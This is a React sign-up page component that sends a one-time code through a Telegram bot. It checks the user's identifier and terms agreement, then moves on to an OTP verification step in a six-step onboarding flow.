import { useState } from 'react'
import { useNavigate, Link } from 'react-router-dom'
import { User, Send, Lock, ArrowRight, Smartphone, MessageCircle, CheckCircle2 } from 'lucide-react'
import { useTame } from '../components/TameNotification'
import { addNotification } from '../services/storageService'
import { sendTelegramOTP } from '../services/authService'

// Generate a random 6-digit OTP (stored in sessionStorage for demo verification)
const genOTP = () => Math.floor(100000 + Math.random() * 900000).toString()

export default function CreateAccount() {
  const navigate = useNavigate()
  const { push } = useTame()
  const [identifier, setIdentifier] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [agreed, setAgreed] = useState(false)

  const handleSend = async () => {
    const val = identifier.trim();
    if (!val) { setError('Enter your Telegram username or phone number'); return; }
    if (val.startsWith('@') && val.length < 4) { setError('Username too short'); return; }
    if (!agreed) { setError('Please accept the terms & conditions'); return; }
    setError('');
    setLoading(true);
    try {
      // Call backend to send OTP via Telegram bot
      await sendTelegramOTP(val);
      // Store identifier and mode for later steps
      sessionStorage.setItem('sxs_identifier', val);
      sessionStorage.setItem('sxs_otp_mode', 'signup');
      sessionStorage.setItem('sxs_otp_ts', Date.now().toString());

      addNotification({
        type: 'telegram',
        title: 'OTP Sent',
        message: `Telegram OTP dispatched to ${val}`,
      });

      push({
        type: 'telegram',
        title: 'OTP Sent via Telegram',
        message: `Please check your Telegram app for the verification code.`,
        duration: 20000,
      });

      navigate('/otp');
    } catch (e) {
      setError(e.message || 'Failed to send OTP');
    } finally {
      setLoading(false);
    }
  }

  const handleKeyDown = (e) => { if (e.key === 'Enter') handleSend() }

  return (
    <div className="page">
      <div className="card animate-in">

        {/* Header */}
        <div className="text-center mb-6">
          <div className="icon-badge cyan" style={{ margin: '0 auto 20px' }}>
            <User size={30} color="#fff" />
          </div>
          <h1 className="page-title">Create Account</h1>
          <p className="page-subtitle">Register via Telegram OTP verification</p>
        </div>

        {/* Steps indicator */}
        <div className="steps">
          {['Telegram', 'OTP', 'Profile', 'Passcode', 'Biometrics', 'KYC'].map((s, i) => (
            <div key={s} className={`step-item ${i === 0 ? 'active' : ''}`}>
              <div className="step-circle">{i + 1}</div>
              <span className="step-label">{s}</span>
            </div>
          ))}
        </div>

        {/* Telegram info banner */}
        <div style={{
          display: 'flex', gap: 10, alignItems: 'flex-start',
          background: 'rgba(6,182,212,0.07)', border: '1px solid rgba(6,182,212,0.2)',
          borderRadius: 12, padding: '12px 14px', marginBottom: 20,
        }}>
          <MessageCircle size={17} color="var(--cyan)" style={{ flexShrink: 0, marginTop: 1 }} />
          <p style={{ fontSize: 12, color: '#8b8ba8', lineHeight: 1.55 }}>
            To create a new account, we will send an activation OTP to you via <strong style={{ color: 'var(--cyan)' }}>@StanbicXBot</strong> on Telegram.
          </p>
        </div>

        {/* Input */}
        <div className="input-group">
          <label className="label">Telegram Username / Phone Number</label>
          <div className="input-wrap">
            <span className="input-icon"><Smartphone size={17} /></span>
            <input
              id="telegram-signup-input"
              className="input"
              type="text"
              placeholder="@username  or  +234XXXXXXXXXX"
              value={identifier}
              onChange={e => { setIdentifier(e.target.value); setError('') }}
              onKeyDown={handleKeyDown}
              autoComplete="off"
            />
          </div>
        </div>

        {/* Terms checkbox */}
        <label style={{ display: 'flex', gap: 10, alignItems: 'flex-start', cursor: 'pointer', marginBottom: 20 }}>
          <div
            id="terms-checkbox"
            onClick={() => { setAgreed(!agreed); setError('') }}
            style={{
              width: 18, height: 18, borderRadius: 5, marginTop: 2, flexShrink: 0,
              border: `2px solid ${agreed ? 'var(--cyan)' : 'var(--border)'}`,
              background: agreed ? 'var(--cyan)' : 'transparent',
              display: 'flex', alignItems: 'center', justifySelf: 'center', justifyContent: 'center',
              transition: 'var(--transition)',
            }}
          >
            {agreed && <CheckCircle2 size={11} color="#fff" />}
          </div>
          <span style={{ fontSize: 13, color: 'var(--text-secondary)', lineHeight: 1.5 }}>
            I agree to the <span className="text-accent" style={{ cursor: 'pointer' }}>Terms of Service</span> and <span className="text-accent" style={{ cursor: 'pointer' }}>Privacy Policy</span>.
          </span>
        </label>

        {error && <p style={{ color: 'var(--red)', fontSize: 13, marginBottom: 16 }}>{error}</p>}

        <button
          id="send-signup-otp-btn"
          className="btn btn-primary"
          style={{ background: 'linear-gradient(135deg, #06b6d4, #0891b2)', boxShadow: '0 0 24px rgba(6,182,212,0.25)', marginBottom: 16 }}
          onClick={handleSend}
          disabled={loading}
        >
          {loading
            ? <><div className="loader" /> Sending OTP…</>
            : <><Send size={15} /> Send OTP via Telegram</>}
        </button>

        <div className="divider" />

        {/* Security info */}
        <div className="info-block">
          <Lock size={17} style={{ flexShrink: 0, marginTop: 1, color: 'var(--accent-hover)' }} />
          <p>Protected by end-to-end multi-layer Telegram verification protocols.</p>
        </div>

        {/* Sign in link */}
        <div className="text-center mt-4">
          <span className="text-muted" style={{ fontSize: 13 }}>Already have an account?{' '}</span>
          <Link to="/login" className="link" style={{ fontSize: 13 }}>
            Sign In <ArrowRight size={13} style={{ display: 'inline', verticalAlign: 'middle' }} />
          </Link>
        </div>
      </div>
    </div>
  )
}
